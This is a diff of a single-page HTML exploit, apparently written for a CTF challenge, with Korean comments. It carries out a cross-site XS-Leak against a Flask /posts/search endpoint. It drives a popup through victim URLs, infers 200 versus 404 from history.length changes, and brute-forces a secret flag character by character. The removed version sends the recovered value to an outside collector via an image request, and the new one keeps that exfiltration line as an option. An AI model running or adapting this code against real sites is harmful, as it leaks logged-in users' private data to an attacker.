@@ -1,113 +1,135 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>Visited-Link XS-Leak for Flask /posts/search</title>
+<title>Visited-Link XS-Leak — Single HTML</title>
+<style>
+  body { font: 14px/1.4 system-ui, sans-serif; padding: 16px; }
+  #log { white-space: pre-wrap; font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
+  .ok { color: #0a0; } .no { color: #a00; }
+</style>
 <script>
-/**
- * === CONFIG ===
- * 공격 페이지는 어디든 상관없음(교차사이트 OK). 
- * victim은 admin-bot이 로그인된 http://localhost:3000 이라고 가정.
- */
+/*** ===================== CONFIG ===================== ***/
+// 이 HTML이 서빙되는 "절대 URL"(컨테이너에서 접근 가능해야 함)
+const ATTACK_URL     = "https://d1x0rhk5.github.io/web_test/attacker.html"; // ← 환경에 맞게 수정 (Linux: 172.17.0.1)
+
+// 피해자 서버(문제 서버) 오리진
 const VICTIM_ORIGIN  = "http://localhost:3000";
+// 오라클 대상 URL 빌더 (여기선 /posts/search?query=...)
 const BUILD_VICTIM   = (guess) => `${VICTIM_ORIGIN}/posts/search?query=${encodeURIComponent(guess)}&_=${Math.random()}`;
+
+// 플래그 형식: DH{[0-9A-F]{10}}
 const HEX            = "0123456789ABCDEF";
 const FLAG_PREFIX    = "DH{";
-const FLAG_BODY_LEN  = 10; // [0-9A-F]{10}
-const NAV_WAIT_MS    = 160; // 내비게이션 대기(환경 따라 120~250 조정)
-const WATCHDOG_MS    = 5000; // 각 시도 타임아웃
-const COLLECTOR_URL  = "https://mzwmhrk.request.dreamhack.games/leak"; 
+const FLAG_BODY_LEN  = 10;
 
-/**
- * 자식 창 모드: #child-start / #child-check 에서 history.length 보고만함.
- */
-if (location.hash.startsWith("#child-start")) {
-  // baseline 보고
-  window.opener && window.opener.postMessage({type:"baseline", len: history.length}, "*");
-} else if (location.hash.startsWith("#child-check")) {
-  // 내비→복귀 후 길이 보고
-  window.opener && window.opener.postMessage({type:"check", len: history.length}, "*");
+// 타이밍(환경에 맞춰 미세조정)
+const NAV_WAIT_MS    = 200;   // 피해자 방문 후 복귀까지 대기 (150~350 권장)
+const POLL_INTERVAL  = 40;    // window.name 폴링 주기
+const POLL_TIMEOUT   = 6000;  // 각 단계 타임아웃(ms)
+
+// (선택) 결과 유출 URL (비우면 페이지에만 표시)
+const COLLECTOR_URL  = ""; // e.g. "http://YOUR_COLLECTOR:8008/leak"
+
+/*** ================== CHILD MODES =================== ***/
+// 같은 파일을 팝업이 열어 사용: #child-start / #child-check 에서 history.length를 window.name에 기록
+if (location.hash === "#child-start") {
+  window.name = "baseline:" + history.length;
+  // 부모가 읽을 때까지 살아있게 유지
+  setInterval(()=>{}, 1000);
+} else if (location.hash === "#child-check") {
+  window.name = "check:" + history.length;
+  setInterval(()=>{}, 1000);
 } else {
-  // 부모(컨트롤러) 모드
-  (async () => {
-    const log = (...a) => { console.log(...a); document.body.insertAdjacentHTML("beforeend", `<div>${a.map(String).join(" ")}</div>`); };
-    const ATTACK_URL = location.href.split("#")[0];
+/*** ================== CONTROLLER =================== ***/
+(async () => {
+  const el = (sel) => document.querySelector(sel);
+  const log = (...a) => { console.log(...a); el("#log").textContent += a.join(" ") + "\n"; };
+  const sleep = (ms)=>new Promise(r=>setTimeout(r,ms));
 
-    // 팝업 1개를 재사용하며, 각 시도마다 baseline→victim→복귀 순서로 길이 델타 측정
-    let w = window.open(`${ATTACK_URL}#child-start`, "xsleak_popup", "popup,width=800,height=600");
+  function openChild() {
+    // 팝업 1개 재사용 (block되면 봇 환경에선 보통 허용됨)
+    return window.open(ATTACK_URL + "#child-start", "xsleak_popup", "popup,width=900,height=700");
+  }
 
-    function onceMessage(expectedType, fromWin, timeoutMs = WATCHDOG_MS) {
-      return new Promise((resolve, reject) => {
-        const to = setTimeout(() => { window.removeEventListener("message", onMsg); reject(new Error("timeout: " + expectedType)); }, timeoutMs);
-        function onMsg(ev) {
-          if (ev.source !== fromWin) return;
-          const d = ev.data || {};
-          if (d.type === expectedType && typeof d.len === "number") {
-            clearTimeout(to);
-            window.removeEventListener("message", onMsg);
-            resolve(d.len);
-          }
+  async function pollFor(prefix, win, timeout=POLL_TIMEOUT) {
+    const start = Date.now();
+    while (Date.now()-start < timeout) {
+      try {
+        // 동일 출처(#child-* 단계)에서만 window.name 접근 가능
+        if (typeof win.name === "string" && win.name.startsWith(prefix + ":")) {
+          const n = parseInt(win.name.split(":")[1] || "", 10);
+          if (!Number.isNaN(n)) return n;
         }
-        window.addEventListener("message", onMsg);
-      });
+      } catch(e) {}
+      await sleep(POLL_INTERVAL);
     }
+    throw new Error("poll timeout for " + prefix);
+  }
 
-    async function ensureBaseline(win) {
-      // 같은 창을 재사용: child-start 로 되돌려 baseline 수집
-      win.location.href = `${ATTACK_URL}#child-start&_=${Math.random()}`;
-      const baseLen = await onceMessage("baseline", win);
-      return baseLen;
-    }
+  async function ensureBaseline(win) {
+    win.location.href = ATTACK_URL + "#child-start&_=" + Math.random();
+    return await pollFor("baseline", win);
+  }
 
-    async function probe200(win, victimURL) {
-      // baseline 확보
-      const before = await ensureBaseline(win);
+  async function probe200(win, victimURL) {
+    const base = await ensureBaseline(win);               // 보통 1
+    win.location.href = victimURL;                        // 최상위 네비 → Lax에서도 쿠키 전송
+    await sleep(NAV_WAIT_MS);
+    win.location.href = ATTACK_URL + "#child-check&_=" + Math.random();
+    const after = await pollFor("check", win);            // 200→ +2, 404→ +1
+    const delta = after - base;
+    return { base, after, delta, is200: (delta >= 2) };
+  }
 
-      // 피해자 URL로 "최상위 네비게이션"(Lax 쿠키 전송됨)
-      win.location.href = victimURL;
+  // ===== 데모 캘리브레이션(원하면 사용) =====
+  // log("[calib] 시작합니다. 필요 없으면 주석 처리");
+  // const w0 = openChild();
+  // // 200 / 404가 분리되는지 Known URL로 확인 (환경 맞게 바꿔도 됨)
+  // const r200 = await probe200(w0, `${VICTIM_ORIGIN}/`);              // 보통 200
+  // log("known 200 delta=", r200.delta, r200.is200 ? "(ok)" : "(x)");
+  // const r404 = await probe200(w0, `${VICTIM_ORIGIN}/.well-known/no`); // 보통 404
+  // log("known 404 delta=", r404.delta, !r404.is200 ? "(ok)" : "(x)");
+  // try { w0.close(); } catch(e){}
 
-      // 충분히 기다렸다가(콘텐츠 로드 신뢰 불가 → 시간 대기) 우리 페이지로 복귀
-      await new Promise(r => setTimeout(r, NAV_WAIT_MS));
-      // cross-origin 이지만 location 쓰기는 허용됨
-      win.location.href = `${ATTACK_URL}#child-check&_=${Math.random()}`;
+  // ===== 본 브루트포스 =====
+  const w = openChild();
+  let body = "";
+  for (let pos = 0; pos < FLAG_BODY_LEN; pos++) {
+    let hit = false;
+    for (const c of HEX) {
+      const guess = FLAG_PREFIX + body + c;   // LIKE '%guess%'
+      const url   = BUILD_VICTIM(guess);
+      const r     = await probe200(w, url);
 
-      const after = await onceMessage("check", win);
-      const delta = after - before;
-      // 기대값: 200 → +2 (victim 기록 + 복귀), 404 → +1 (victim 미기록 + 복귀만)
-      const is200 = (delta >= 2);
-      return {before, after, delta, is200};
-    }
+      log(`[pos ${pos}] ${guess} → delta=${r.delta} → ${r.is200 ? "%c200" : "%c404"}`,
+          r.is200 ? "color:#0a0" : "color:#a00");
 
-    // ====== 브루트포스 본체 ======
-    let body = "";
-    outer:
-    while (body.length < FLAG_BODY_LEN) {
-      let hit = false;
-      // 같은 팝업 재사용으로 속도↑
-      for (const c of HEX) {
-        const guess = FLAG_PREFIX + body + c;
-        const url   = BUILD_VICTIM(guess);
-        const r     = await probe200(w, url);
-        log(`[pos ${body.length}] try ${guess} → delta=${r.delta} → ${r.is200 ? "200" : "404"}`);
-        if (r.is200) {
-          body += c;
-          hit = true;
-          break;
-        }
-      }
-      if (!hit) {
-        log("[-] no candidate matched at pos", body.length, " — 중단");
-        break outer;
+      if (r.is200) {
+        body += c;
+        hit = true;
+        break;
       }
     }
+    if (!hit) { log("[-] no candidate matched at pos", pos, " — 중단"); break; }
+  }
 
-    const flag = FLAG_PREFIX + body + "}";
-    log("[+] FLAG ?", flag);
+  const flag = FLAG_PREFIX + body + "}";
+  el("#flag").textContent = flag;
+  log("[+] FLAG ?", flag);
 
-    // 수집기로 유출(선택)
+  if (COLLECTOR_URL) {
+    // 결과 유출(선택)
     new Image().src = `${COLLECTOR_URL}?f=${encodeURIComponent(flag)}&_=${Math.random()}`;
-
-    try { w.close(); } catch(e) {}
-  })();
+  }
+  try { w.close(); } catch(e){}
+})();
 }
 </script>
-<h1>Visited-Link XS-Leak for /posts/search</h1>
-<p>콘솔 로그를 보세요. (각 시도별 delta=2 → 200 / delta=1 → 404)</p>
+
+<h1>Visited-Link XS-Leak — Single HTML</h1>
+<ol>
+  <li>이 파일을 <b>ATTACK_URL</b>로 접근 가능하도록 호스팅한다.</li>
+  <li>CTF 서버의 <code>/report</code>에 이 URL 제출 → admin-bot이 열어본다.</li>
+  <li>콘솔 및 아래 로그/결과를 확인한다.</li>
+</ol>
+<p><b>결과:</b> <code id="flag">...</code></p>
+<pre id="log"></pre>
